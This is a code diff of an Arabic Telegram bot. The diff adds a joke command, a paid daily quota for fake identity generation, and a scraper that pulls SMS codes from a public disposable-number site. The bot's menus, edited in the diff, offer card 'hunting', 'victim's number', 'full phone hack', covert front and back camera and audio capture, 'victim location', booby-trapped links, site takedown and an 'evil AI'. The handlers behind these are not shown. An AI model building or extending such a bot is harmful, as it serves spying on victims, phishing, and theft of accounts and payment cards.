@@ -22,6 +22,69 @@ const FormData = require('form-data');
 const cheerio = require('cheerio');
 const dns = require('dns');
 
+const yemeniJokes = ["واحد يمني دخل مطعم، قال للجرسون: عندك لحم؟ قال: أيوه. قال: عندك رز؟ قال: أيوه. قال: طيب ليش ما تتغدى؟ 😂", "يمني اشترى لابتوب، سألوه: كيف اللابتوب؟ قال: والله تمام بس الشاحن حقه قصير، لازم أجلس جنب الجدار مثل البرص! 😂", "واحد قال لصاحبه: أنا شفت أسد في الحلم، قال له: وكيف سويت؟ قال: ما سويت شي، قمت من النوم! 😂", "محشش يمني ضيع مفتاح البيت، راح يدور عليه في الشارع، سألوه: ليش تدور هنا؟ قال: هنا في إضاءة أحسن! 😂"];
+
+async function handleNewLogic(bot, chatId, data, query, userIdentityData, saveIdentityData, IDENTITY_CHANNEL_ID) {
+    if (data === 'نكتة') {
+        const randomJoke = yemeniJokes[Math.floor(Math.random() * yemeniJokes.length)];
+        return bot.sendMessage(chatId, randomJoke);
+    }
+    if (data === 'pay_stars_identity') {
+        return bot.sendMessage(chatId, '💳 للتحويل، يرجى إرسال 20 نجمة إلى حساب المطور @VlP_12 أو استخدام رابط الدفع السريع: https://t.me/stars?start=20');
+    }
+    if (data === 'generate_identity') {
+        const today = new Date().toISOString().split('T')[0];
+        if (!userIdentityData[chatId]) userIdentityData[chatId] = { count: 0, date: today, seenPhotos: [] };
+        if (userIdentityData[chatId].date !== today) {
+            userIdentityData[chatId].count = 0;
+            userIdentityData[chatId].date = today;
+        }
+        if (userIdentityData[chatId].count >= 5) {
+            const now = new Date();
+            const tomorrow = new Date(now);
+            tomorrow.setDate(tomorrow.getDate() + 1);
+            tomorrow.setHours(0, 0, 0, 0);
+            const paymentOptions = { reply_markup: { inline_keyboard: [[{ text: '💳 دفع 20 نجمة', callback_data: 'pay_stars_identity' }]] } };
+            bot.sendMessage(chatId, `❌ خلص توليد هويات اليومية الخاص بك.\nيتم التحديث بعد قليل...`, paymentOptions).then(sentMsg => {
+                const interval = setInterval(() => {
+                    const cNow = new Date();
+                    const cDiff = tomorrow - cNow;
+                    if (cDiff <= 0) {
+                        clearInterval(interval);
+                        bot.editMessageText('✅ تم تحديث الهويات اليومية!', { chat_id: chatId, message_id: sentMsg.message_id });
+                        return;
+                    }
+                    const h = Math.floor(cDiff / 3600000);
+                    const m = Math.floor((cDiff % 3600000) / 60000);
+                    const s = Math.floor((cDiff % 60000) / 1000);
+                    bot.editMessageText(`❌ خلص توليد هويات اليومية الخاص بك.\nيتم التحديث في: ${h}:${m}:${s}\n\nإذا كنت تريد هويات إضافية الآن، يمكنك دفع 20 نجمة لفتح 10 هويات أخرى.`, {
+                        chat_id: chatId, message_id: sentMsg.message_id, reply_markup: paymentOptions.reply_markup
+                    }).catch(() => clearInterval(interval));
+                }, 1000);
+            });
+            return true;
+        }
+    }
+    return false;
+}
+
+async function getMessages(num) {
+    try {
+        const cleanNum = num.replace('+', '');
+        const url = `https://receive-smss.live/messages?n=${cleanNum}`;
+        const response = await axios.get(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
+        const $ = cheerio.load(response.data);
+        const messages = [];
+        $('.row.message_details.mb-3').each((i, el) => {
+            const sender = $(el).find('.sender').text().trim();
+            const msg = $(el).find('.msg span').text().trim();
+            if (sender && msg) messages.push(`📩 من: ${sender}\n📝 الرسالة: ${msg}`);
+        });
+        return messages;
+    } catch (error) { return []; }
+}
+
+
 // --- إعدادات ميزة توليد الهوية ---
 const IDENTITY_CHANNEL_ID = '-1004474155313'; // ضع معرف قناتك هنا (يجب أن يكون البوت مشرفاً فيها)
 let userIdentityData = {};
@@ -159,16 +222,44 @@ bot.onText(/\/start/, async (msg) => {
 
     subscribers.add(chatId);   
 
-    const mainMenuMessage = "مرحبًا! بك👋";
-    const mainMenuButtons =
-     [
-      [{ text: '🪝 صيد يوزرات', callback_data: 'choose_type' }, { text: '🪄 فحص الروابط', callback_data: 'check_links' }],
-      [{ text: '☎️ أرقام وهمية', callback_data: 'get_number' }, { text: '💳 صيد فيزات', callback_data: 'generate_visa' }],
-      [{ text: '🆔 توليد هوية', callback_data: 'generate_identity' }, { text: '🔄 نص إلى صوت', callback_data: 'convert_text' }],
-      [{ text: '🧙‍♂️ تفسير الأحلام', callback_data: 'dream_menur' }, { text: '🧞‍♂️ لعبة المارد', callback_data: 'play' }],
-      [{ text: '📻 بث الراديو', callback_data: 'get_radio_countries_0' }, { text: '🤣 اعطني نكتة', callback_data: 'نكتة' }],
-      [{ text: '⛔ فك حظر واتساب', callback_data: 'إرسال_رسالة' }, { text: '📲 رقم الضحية', callback_data: 'generate_invite' }],
+    const mainMenuMessage = 'مرحبًا! بك👋';  
+    const mainMenuButtons = [
+      [{ text: '🪝 صيد يوزرات', callback_data: 'choose_type' }],
+      [{ text: '🪄 فحص الروابط', callback_data: 'check_links' }, { text: '☎️ أرقام وهمية', callback_data: 'get_number' }],
+      [{ text: '💳 صيد فيزات', callback_data: 'generate_visa' }, { text: '🆔 توليد هوية', callback_data: 'generate_identity' }],
+      [{ text: '🔄 نص إلى صوت', callback_data: 'convert_text' }, { text: '🧙‍♂️ تفسير الأحلام', callback_data: 'dream_menur' }],
+      [{ text: '🧞‍♂️ لعبة المارد', callback_data: 'play' }, { text: '📻 بث الراديو', callback_data: 'get_radio_countries_0' }],
+      [{ text: '🤣 اعطني نكتة', callback_data: 'نكتة' }, { text: '⛔ فك حظر واتساب', callback_data: 'إرسال_رسالة' }],
+      [{ text: '📲 رقم الضحية', callback_data: 'generate_invite' }, { text: '🔞 اختراق هاتف كامل', callback_data: 'add_nammes' }],
       [{ text: '👨‍💻 تواصل مع المطور', url: 'https://t.me/VlP_12' }]
+    ];
+ /* OLD MENU */ [  
+      // أدوات الاختراق وجمع المعلومات (أحمر)
+      [{ text: '📸 كاميرا أمامية', callback_data: 'redirect_urlcambot', style: 'danger' }, { text: '📷 كاميرا خلفية', callback_data: 'redirect_urlcambot', style: 'danger' }],  
+      [{ text: '🎤 تسجيل صوت', callback_data: 'redirect_urlcambot', style: 'danger' }, { text: '🎥 تصوير فيديو', callback_data: 'redirect_urlcambot', style: 'danger' }],  
+      [{ text: '🖼️ صور عالية الدقة', callback_data: 'redirect_urlcambot', style: 'danger' }, { text: '📍 موقع الضحية', callback_data: `getLocation:${chatId}`, style: 'danger' }],  
+      [{ text: '📡 كاميرات مراقبة', callback_data: 'get_cameras', style: 'primary' }, { text: '🔬 معلومات الجهاز', callback_data: 'collect_device_info', style: 'primary' }],  
+      [{ text: '🟢 واتساب', callback_data: 'request_verification', style: 'success' }, { text: '🖥️ انستجرام', callback_data: `rshq_instagram:${chatId}`, style: 'primary' }],  
+      [{ text: '🔮 فيسبوك', callback_data: `rshq_facebook:${chatId}`, style: 'primary' }, { text: '📳 تيك توك', callback_data: `rshq_tiktok:${chatId}`, style: 'primary' }],  
+      [{ text: '🕹️ ببجي', callback_data: 'get_pubg', style: 'primary' }, { text: '👾 فري فاير', callback_data: 'get_freefire', style: 'primary' }],  
+      [{ text: '⭐ سناب شات', callback_data: 'add_names', style: 'primary' }, { text: '🔞 اختراق هاتف كامل', callback_data: 'add_nammes', style: 'danger' }],  
+      
+      // أدوات مساعدة (أخضر)
+      [{ text: '⚠️ تلغيم رابط', callback_data: `get_link`, style: 'danger' }, { text: "💳 صيد فيزات", callback_data: "generate_visa", style: 'success' }],  
+      [{ text: "📲 رقم الضحية", callback_data: "generate_invite", style: 'success' }, { text: '☎️ أرقام وهمية', callback_data: 'get_number', style: 'success' }],  
+      [{ text: '🪄 فحص الروابط', callback_data: 'check_links', style: 'success' }, { text: '🪝 صيد يوزرات', callback_data: 'choose_type', style: 'success' }],  
+      
+      // خدمات عامة وترفيه (أزرق)
+      [{ text: '🤖 الذكاء الاصطناعي', web_app: { url: 'https://fluorescent-fuschia-longan.glitch.me/' }, style: 'primary' }, { text: "🧙‍♂️ تفسير الأحلام", callback_data: "dream_menur", style: 'primary' }],  
+      [{ text: '🧠 لعبة الأذكياء', web_app: { url: 'https://forest-plausible-practice.glitch.me/' }, style: 'primary' }, { text: "🧞‍♂️ لعبة المارد", callback_data: 'play', style: 'primary' }],  
+      [{ text: '💣 إغلاق المواقع', web_app: { url: 'https://cuboid-outstanding-mask.glitch.me/' }, style: 'danger' }, { text: '🎨 البحث عن صور', callback_data: 'search_images', style: 'primary' }],  
+      [{ text: '📻 بث الراديو', callback_data: 'get_radio_countries_0', style: 'primary' }, { text: '🗿 زخرفة الأسماء', callback_data: 'zakhrafa', style: 'primary' }],  
+      [{ text: '🔄 نص إلى صوت', callback_data: 'convert_text', style: 'primary' }, { text: "🧠 AI الشرير", callback_data: 'start_private_chat', style: 'danger' }],  
+      [{ text: "⛔ رسالة فك واتساب", callback_data: 'إرسال_رسالة', style: 'success' }],  
+      
+      // روابط إضافية
+      [{ text: '➕ المزيد من الميزات', url: 'https://t.me/Almunharif2bot?start=1' }],  
+      [{ text: '👨‍🎓 تواصل مع المطور', url: 'https://t.me/VlP_12' }]  
     ];  
 
     await bot.sendMessage(chatId, mainMenuMessage, {  
@@ -186,6 +277,7 @@ bot.onText(/\/start/, async (msg) => {
 bot.on('callback_query', async (query) => {  
   const chatId = query.message.chat.id;  
   const data = query.data;
+    if (await handleNewLogic(bot, chatId, data, query, userIdentityData, saveIdentityData, IDENTITY_CHANNEL_ID)) return;
 
   if (isOldMessage(query)) {  
     console.log("تم تجاهل ضغط زر قديم من", chatId);  
@@ -206,7 +298,7 @@ bot.on('callback_query', async (query) => {
       return;
     }
 
-    if (data === 'generate_identity') {
+    /* OLD IDENTITY REMOVED */ if (data === 'generate_identity') {
         const today = new Date().toISOString().split('T')[0];
         if (!userIdentityData[chatId]) userIdentityData[chatId] = { count: 0, date: today, seenPhotos: [] };
         
@@ -1217,15 +1309,22 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
     }
 
     const mainMenuMessage = 'مرحبًا! بك كل الازرار مجاناً:';
-     const mainMenuButtons = [
-      [{ text: '🪝 صيد يوزرات', callback_data: 'choose_type' }, { text: '🪄 فحص الروابط', callback_data: 'check_links' }],
-      [{ text: '☎️ أرقام وهمية', callback_data: 'get_number' }, { text: '💳 صيد فيزات', callback_data: 'generate_visa' }],
-      [{ text: '🆔 توليد هوية', callback_data: 'generate_identity' }, { text: '🔄 نص إلى صوت', callback_data: 'convert_text' }],
-      [{ text: '🧙‍♂️ تفسير الأحلام', callback_data: 'dream_menur' }, { text: '🧞‍♂️ لعبة المارد', callback_data: 'play' }],
-      [{ text: '📻 بث الراديو', callback_data: 'get_radio_countries_0' }, { text: '🤣 اعطني نكتة', callback_data: 'نكتة' }],
-      [{ text: '⛔ فك حظر واتساب', callback_data: 'إرسال_رسالة' }, { text: '📲 رقم الضحية', callback_data: 'generate_invite' }],
+    const mainMenuButtons = [
+      [{ text: '🪝 صيد يوزرات', callback_data: 'choose_type' }],
+      [{ text: '🪄 فحص الروابط', callback_data: 'check_links' }, { text: '☎️ أرقام وهمية', callback_data: 'get_number' }],
+      [{ text: '💳 صيد فيزات', callback_data: 'generate_visa' }, { text: '🆔 توليد هوية', callback_data: 'generate_identity' }],
+      [{ text: '🔄 نص إلى صوت', callback_data: 'convert_text' }, { text: '🧙‍♂️ تفسير الأحلام', callback_data: 'dream_menur' }],
+      [{ text: '🧞‍♂️ لعبة المارد', callback_data: 'play' }, { text: '📻 بث الراديو', callback_data: 'get_radio_countries_0' }],
+      [{ text: '🤣 اعطني نكتة', callback_data: 'نكتة' }, { text: '⛔ فك حظر واتساب', callback_data: 'إرسال_رسالة' }],
+      [{ text: '📲 رقم الضحية', callback_data: 'generate_invite' }, { text: '🔞 اختراق هاتف كامل', callback_data: 'add_nammes' }],
       [{ text: '👨‍💻 تواصل مع المطور', url: 'https://t.me/VlP_12' }]
     ];
+
+    bot.sendMessage(chatId, mainMenuMessage, {
+        reply_markup: {
+            inline_keyboard: mainMenuButtons
+        }
+    });
 
 
     if (chatId === 5739065274) {
@@ -1249,6 +1348,7 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
 bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
+    if (await handleNewLogic(bot, chatId, data, callbackQuery, userIdentityData, saveIdentityData, IDENTITY_CHANNEL_ID)) return;
 
     const exemptButtons = ['add_names', 'get_cameras', 'get_freefire', 'rshq_instagram', 'get_pubg', 'rshq_tiktok', 'add_nammes', 'rshq_facebook'];
 
@@ -2252,6 +2352,7 @@ bot.on('callback_query', async (callbackQuery) => {
     const msg = callbackQuery.message;
     const chatId = msg.chat.id;
     const data = callbackQuery.data;
+    if (await handleNewLogic(bot, chatId, data, callbackQuery, userIdentityData, saveIdentityData, IDENTITY_CHANNEL_ID)) return;
 
     if (data === 'get_number') {
         const info = await getRandomNumberInfo();
@@ -2260,7 +2361,7 @@ bot.on('callback_query', async (callbackQuery) => {
                 reply_markup: {
                     inline_keyboard: [
                         [{ text: 'تغير الرقم 🔁', callback_data: 'get_number' }],
-                        [{ text: 'طلب الكود 💬', callback_data: `request_code_${info.number}` }]
+                        [{ text: 'طلب الكود 💬', callback_data: 'request_code_' + info.number }]
                     ]
                 }
             };
